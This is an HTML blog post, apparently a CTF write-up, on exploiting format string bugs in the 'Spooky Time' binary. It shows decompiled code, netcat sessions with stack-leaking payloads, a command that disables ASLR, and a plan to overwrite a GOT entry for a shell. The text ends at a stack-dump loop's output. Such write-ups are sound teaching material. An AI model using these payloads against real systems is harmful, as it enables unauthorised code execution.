<!doctype html><html lang="en"><head><title>Spooky Time | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="description" content="64-bit binary. Format String vulnerability. GOT overwrite"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="64-bit binary. Format String vulnerability. GOT overwrite"><meta itemprop="keywords" content><meta itemprop="name" content="Spooky Time"><meta property="article:published_time" content><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:description" content="64-bit binary. Format String vulnerability. GOT overwrite"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:locale" content="en_US"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:title" content="Spooky Time"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/en/ctf/other/hackthebooctf/spooky-time/"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:card" content="64-bit binary. Format String vulnerability. GOT overwrite"><meta name="twitter:description" content="64-bit binary. Format String vulnerability. GOT overwrite"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:title" content="Spooky Time"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/en/ctf/other/hackthebooctf/spooky-time/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg>
</a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/ctf/other/hackthebooctf/spooky-time/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HACKTHEBOO CTF</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/ctf/other/hackthebooctf/spooky-time/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/ctf/other/hackthebooctf/spooky-time/&amp;text=Spooky%20Time" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/ctf/other/hackthebooctf/spooky-time/&amp;title=Spooky%20Time" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Spooky Time</h1><p class="mb4 f6 dib tracked">9 minutes to read</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#reverse-engineering">Reverse engineering</a><ul><li><a href="#format-string-vulnerability">Format String vulnerability</a></li></ul></li><li><a href="#format-string-exploitation">Format String exploitation</a><ul><li><a href="#leaking-memory-addresses">Leaking memory addresses</a></li><li><a href="#exploit-develpment">Exploit develpment</a></li><li><a href="#getting-rce">Getting RCE</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">üç∫ <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>We are given a 64-bit binary called <code>spooky_time</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Arch:     amd64-64-little  
RELRO:    <span class="code-dark-red">No RELRO</span>
Stack:    <span class="code-dark-green">Canary found</span>
NX:       <span class="code-dark-green">NX enabled</span>
PIE:      <span class="code-dark-green">PIE enabled</span>
RUNPATH:  <span class="code-dark-red">b'./glibc/'
</code></pre></div><h2 id="reverse-engineering">Reverse engineering</h2><p>If we open the binary in Ghidra we will see this <code>main</code> function:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> in_FS_OFFSET;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> first_input[</span><span class="mtk6">12</span><span class="mtk1">];</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> second_input[</span><span class="mtk6">312</span><span class="mtk1">];</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> canary;</span>

<span class="mtk1">  canary </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">setup</span><span class="mtk1">();</span>
<span class="mtk1">  </span><span class="mtk8">banner</span><span class="mtk1">();</span>

<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"It</span><span class="mtk6">\'</span><span class="mtk4">s your chance to scare those little kids, say some</span><span class="mtk4">thing scary!</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%11s</span><span class="mtk4">"</span><span class="mtk1">, first_input);</span>
<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">Seriously?? I bet you can do better than "</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(first_input);</span>
<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">Anyway, here comes another bunch of kids, let</span><span class="mtk6">\'</span><span class="mtk4">s try one more time.."</span><span class="mtk1">);</span>  
<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>

<span class="mtk1">  </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%299s</span><span class="mtk4">"</span><span class="mtk1">, second_input);</span>
<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">Ok, you are not good with that, do you think that </span><span class="mtk4">was scary??</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(second_input);</span>
<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Better luck next time!</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (canary </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">)) {</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">    </span><span class="mtk8">__stack_chk_fail</span><span class="mtk1">();</span>
<span class="mtk1">  }</span>
<span class="mtk1">}</span>
</code></pre></div><h3 id="format-string-vulnerability">Format String vulnerability</h3><p>There are two Format String vulnerabilities since we can provide two strings that will be used as first parameter for <code>printf</code>. The first parameter of <code>printf</code> is supposed to be a format string to parse subsequent parameters as integers (<code>%d</code>), hexadecimal values (<code>%x</code>), characters (<code>%c</code>), strings (<code>%s</code>)&mldr;</p><p>If we have control of this parameter, we can dump values from the stack because we can enter formats and trick <code>printf</code> to think that there are a lot of parameters in <code>printf</code>. For example:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> 159.65.48.79 31023


<span class="code-magenta">You know what time it is? It's SPOOKY time!</span>


<span class="code-magenta">        ‚ñó‚ñÑ ‚ñù‚ñÄ‚ñÄ‚ñÄ ‚ñó‚ñÑ</span>
<span class="code-magenta">      ‚ñó‚ñû‚ñò         ‚ñù‚ñÄ‚ñÑ</span>
<span class="code-magenta">     ‚ñû‚ñò              ‚ñò‚ññ   ‚ñó   ‚ñó   ‚ñó   ‚ñó   ‚ñó   ‚ñó   ‚ñó   ‚ñó</span>
<span class="code-magenta">   ‚ñù‚ñû                 ‚ñù‚ññ‚ñù    ‚ñò   ‚ñò   ‚ñò   ‚ñò   ‚ñò   ‚ñò   ‚ñò   ‚ñò</span>
<span class="code-magenta">   ‚ñê                   ‚ñö</span>
<span class="code-magenta">   ‚ñå   ‚ñó‚ñÑ‚ñÑ       ‚ñÑ‚ññ    ‚ñù‚ññ   ‚ññ            ‚ñÑ‚ñÑ‚ññ ‚ñò ‚ñó‚ñÑ‚ññ</span>
<span class="code-magenta">  ‚ñê    ‚ñà‚ñà‚ñà      ‚ñà‚ñà‚ñà‚ñå    ‚ñå ‚ñù    ‚ññ‚ñò  ‚ññ‚ñò ‚ñó‚ñû‚ñÄ         ‚ñÄ‚ñó‚ñò ‚ñó ‚ñò ‚ñó</span>
<span class="code-magenta">  ‚ñû    ‚ñù‚ñÄ‚ñò  ‚ñÑ‚ñÑ  ‚ñù‚ñÄ‚ñÄ     ‚ñê            ‚ñû‚ñò             ‚ñÄ‚ññ</span>
<span class="code-magenta">  ‚ñå        ‚ñê‚ñà‚ñà‚ñå         ‚ñê           ‚ñû                ‚ñù‚ññ</span>
<span class="code-magenta">  ‚ñå         ‚ñÄ‚ñÄ          ‚ñê    ‚ññ‚ñò   ‚ñó‚ñû                  ‚ñê</span>
<span class="code-magenta">  ‚ñå                     ‚ñê        ‚ñù‚ñó‚ñò                   ‚ñö ‚ñù</span>
<span class="code-magenta">  ‚ñå                     ‚ñê         ‚ñê     ‚ñÑ‚ñÑ‚ññ      ‚ñÑ‚ñÑ‚ññ   ‚ñù‚ññ</span>
<span class="code-magenta">  ‚ñå                     ‚ñê       ‚ññ ‚ñå    ‚ñê‚ñà‚ñà‚ñà     ‚ñê‚ñà‚ñà‚ñõ    ‚ñö</span>
<span class="code-magenta">  ‚ñå                      ‚ññ   ‚ñò    ‚ñå     ‚ñÄ‚ñÄ‚ñò      ‚ñÄ‚ñÄ‚ñò    ‚ñê</span>
<span class="code-magenta">  ‚ñö                      ‚ñö        ‚ñå         ‚ñê‚ññ‚ñó‚ñå        ‚ñù</span>
<span class="code-magenta">  ‚ñê                      ‚ñù‚ññ ‚ññ  ‚ñò  ‚ñå                     ‚ñù‚ñå</span>
<span class="code-magenta">  ‚ñù‚ññ                      ‚ñù‚ññ      ‚ñå                      ‚ñå</span>
<span class="code-magenta">   ‚ñå                       ‚ñù‚ñÑ  ‚ññ  ‚ñå                      ‚ñå</span>
<span class="code-magenta">   ‚ñö                         ‚ñå   ‚ñù‚ñå                      ‚ñå</span>
<span class="code-magenta">   ‚ñê                       ‚ñÑ‚ñÄ    ‚ñê                       ‚ñå</span>
<span class="code-magenta">    ‚ñå   ‚ñÑ‚ñÑ‚ññ       ‚ñÑ‚ñù‚ñò‚ñò ‚ñÄ‚ñÄ‚ñÄ       ‚ñå                      ‚ñó‚ñò</span>
<span class="code-magenta">  ‚ñó ‚ñù‚ñÑ‚ñÄ‚ñò   ‚ñù‚ñÄ ‚ñÑ‚ñÑ‚ññ‚ñÄ              ‚ñê                       ‚ñê</span>
<span class="code-magenta">                               ‚ñê‚ñò                       ‚ñê</span>
<span class="code-magenta">                     ‚ñó        ‚ñû‚ñò                        ‚ñû</span>
<span class="code-magenta">                    ‚ñó   ‚ññ ‚ñù  ‚ñõ                          ‚ñå</span>
<span class="code-magenta">  ‚ñù ‚ñù       ‚ññ‚ñò ‚ñó  ‚ñó‚ñù          ‚ñö‚ññ                       ‚ñê</span>
<span class="code-magenta">         ‚ñó                   ‚ññ  ‚ñÄ ‚ñù‚ñÄ‚ñÄ ‚ñÄ‚ñò‚ñÑ       ‚ñó‚ñÑ‚ñÑ‚ññ   ‚ñå</span>
<span class="code-magenta">      ‚ñó‚ñù                ‚ñó ‚ñò ‚ñò            ‚ñÄ ‚ñÑ‚ñÑ‚ññ‚ñù‚ñÄ    ‚ñù‚ñò‚ñû</span>


It's your chance to scare those little kids, say something scary!

%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.

Seriously?? I bet you can do better than
1.1.7f775011ca37
Anyway, here comes another bunch of kids, let's try one more time..



Ok, you are not good with that, do you think that was scary??

.1.1.7f775011ca37.3f.7ffe4a82e21c.2e786c2500000000.786c252e786c25.786c252e786c252e.786c252e786c252e.786c252e786c252e.786c252e786c252e.786c252e786c252e.786c252e786c252e.786c252e786c252e.786c252e786c252e.2e786c252e.0.Better luck next time!  
</code></pre></div><p>On the other hand, Format Strings vulnerabilites provide attackers the ability to write arbitrary data into arbitrary memory (write-what-where primitive) because of <code>%n</code>. This format works by storing the number of bytes printed up to the format string into the referenced address.</p><p>Since our string is stored in the stack, we can control the position where we can store data. This time, we can control from position 8, let&rsquo;s check it:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> 159.65.48.79 31023


<span class="code-yellow">You know what time it is? It's SPOOKY time!</span>


<span class="code-yellow">        ‚ñó‚ñÑ ‚ñù‚ñÄ‚ñÄ‚ñÄ ‚ñó‚ñÑ</span>
<span class="code-yellow">      ‚ñó‚ñû‚ñò         ‚ñù‚ñÄ‚ñÑ</span>
<span class="code-yellow">     ‚ñû‚ñò              ‚ñò‚ññ   ‚ñó   ‚ñó   ‚ñó   ‚ñó   ‚ñó   ‚ñó   ‚ñó   ‚ñó</span>
<span class="code-yellow">   ‚ñù‚ñû                 ‚ñù‚ññ‚ñù    ‚ñò   ‚ñò   ‚ñò   ‚ñò   ‚ñò   ‚ñò   ‚ñò   ‚ñò</span>
<span class="code-yellow">   ‚ñê                   ‚ñö</span>
<span class="code-yellow">   ‚ñå   ‚ñó‚ñÑ‚ñÑ       ‚ñÑ‚ññ    ‚ñù‚ññ   ‚ññ            ‚ñÑ‚ñÑ‚ññ ‚ñò ‚ñó‚ñÑ‚ññ</span>
<span class="code-yellow">  ‚ñê    ‚ñà‚ñà‚ñà      ‚ñà‚ñà‚ñà‚ñå    ‚ñå ‚ñù    ‚ññ‚ñò  ‚ññ‚ñò ‚ñó‚ñû‚ñÄ         ‚ñÄ‚ñó‚ñò ‚ñó ‚ñò ‚ñó</span>
<span class="code-yellow">  ‚ñû    ‚ñù‚ñÄ‚ñò  ‚ñÑ‚ñÑ  ‚ñù‚ñÄ‚ñÄ     ‚ñê            ‚ñû‚ñò             ‚ñÄ‚ññ</span>
<span class="code-yellow">  ‚ñå        ‚ñê‚ñà‚ñà‚ñå         ‚ñê           ‚ñû                ‚ñù‚ññ</span>
<span class="code-yellow">  ‚ñå         ‚ñÄ‚ñÄ          ‚ñê    ‚ññ‚ñò   ‚ñó‚ñû                  ‚ñê</span>
<span class="code-yellow">  ‚ñå                     ‚ñê        ‚ñù‚ñó‚ñò                   ‚ñö ‚ñù</span>
<span class="code-yellow">  ‚ñå                     ‚ñê         ‚ñê     ‚ñÑ‚ñÑ‚ññ      ‚ñÑ‚ñÑ‚ññ   ‚ñù‚ññ</span>
<span class="code-yellow">  ‚ñå                     ‚ñê       ‚ññ ‚ñå    ‚ñê‚ñà‚ñà‚ñà     ‚ñê‚ñà‚ñà‚ñõ    ‚ñö</span>
<span class="code-yellow">  ‚ñå                      ‚ññ   ‚ñò    ‚ñå     ‚ñÄ‚ñÄ‚ñò      ‚ñÄ‚ñÄ‚ñò    ‚ñê</span>
<span class="code-yellow">  ‚ñö                      ‚ñö        ‚ñå         ‚ñê‚ññ‚ñó‚ñå        ‚ñù</span>
<span class="code-yellow">  ‚ñê                      ‚ñù‚ññ ‚ññ  ‚ñò  ‚ñå                     ‚ñù‚ñå</span>
<span class="code-yellow">  ‚ñù‚ññ                      ‚ñù‚ññ      ‚ñå                      ‚ñå</span>
<span class="code-yellow">   ‚ñå                       ‚ñù‚ñÑ  ‚ññ  ‚ñå                      ‚ñå</span>
<span class="code-yellow">   ‚ñö                         ‚ñå   ‚ñù‚ñå                      ‚ñå</span>
<span class="code-yellow">   ‚ñê                       ‚ñÑ‚ñÄ    ‚ñê                       ‚ñå</span>
<span class="code-yellow">    ‚ñå   ‚ñÑ‚ñÑ‚ññ       ‚ñÑ‚ñù‚ñò‚ñò ‚ñÄ‚ñÄ‚ñÄ       ‚ñå                      ‚ñó‚ñò</span>
<span class="code-yellow">  ‚ñó ‚ñù‚ñÑ‚ñÄ‚ñò   ‚ñù‚ñÄ ‚ñÑ‚ñÑ‚ññ‚ñÄ              ‚ñê                       ‚ñê</span>
<span class="code-yellow">                               ‚ñê‚ñò                       ‚ñê</span>
<span class="code-yellow">                     ‚ñó        ‚ñû‚ñò                        ‚ñû</span>
<span class="code-yellow">                    ‚ñó   ‚ññ ‚ñù  ‚ñõ                          ‚ñå</span>
<span class="code-yellow">  ‚ñù ‚ñù       ‚ññ‚ñò ‚ñó  ‚ñó‚ñù          ‚ñö‚ññ                       ‚ñê</span>
<span class="code-yellow">         ‚ñó                   ‚ññ  ‚ñÄ ‚ñù‚ñÄ‚ñÄ ‚ñÄ‚ñò‚ñÑ       ‚ñó‚ñÑ‚ñÑ‚ññ   ‚ñå</span>
<span class="code-yellow">      ‚ñó‚ñù                ‚ñó ‚ñò ‚ñò            ‚ñÄ ‚ñÑ‚ñÑ‚ññ‚ñù‚ñÄ    ‚ñù‚ñò‚ñû</span>


It's your chance to scare those little kids, say something scary!

asdf

Seriously?? I bet you can do better than
asdf
Anyway, here comes another bunch of kids, let's try one more time..  


AAAABBBB%8$lx

Ok, you are not good with that, do you think that was scary??

AAAABBBB4242424241414141Better luck next time!
</code></pre></div><p>We entered <code>AAAABBBB</code> and <code>%8$lx</code> was replaced by <code>4242424241414141</code>, which is the same in hexadecimal format, little-endian.</p><h2 id="format-string-exploitation">Format String exploitation</h2><p>Hence, we have a way to get an arbitrary write primitive. Since the binary has Partial RELRO, we can modify the entry of <code>puts</code> at the Global Offset Table (GOT) and set a <a href="https://github.com/david942j/one_gadget"><code>one_gadget</code></a> shell in order to get a shell.</p><p>Since PIE and ASLR are enabled, we will need to get two memory leaks to bypass them.</p><h3 id="leaking-memory-addresses">Leaking memory addresses</h3><p>First of all, let&rsquo;s disable ASLR temporarily:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">echo</span> 0 | <span class="code-dark-green">tee</span> <span class="mtku">/proc/sys/kernel/randomize_va_space</span>  
0
</code></pre></div><p>Now, using a <code>for</code> loop and some shell scripting, we can extract stack values iterating through each position using the Format String vulnerability:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-yellow">for</span> i in {1..100}; <span class="code-dark-yellow">do</span> <span class="code-dark-green">echo</span> -n <span class="code-dark-yellow">"<span class="code-dark-cyan">$i</span>: "</span>; <span class="code-dark-green">echo</span> <span class="code-dark-yellow">"%<span class="code-dark-cyan">$i\$</span>lx\n"</span> | <span class="code-dark-green">./spooky_time</span> | <span class="code-dark-green">tail</span> -9 | <span class="code-dark-green">head</span> -1; <span class="code-dark-yellow">done</span>  
1: 1
2: 1
3: 7ffff7ea7a37
4: 2a
5: 7ffff7fac280
6: 6c24362500000000
7: 78
8: 0
9: 0
10: 0
11: 0
12: 0
13: 0
14: 0
15: 0
16: 0
17: 0
18: 0
19: 0
20: 0
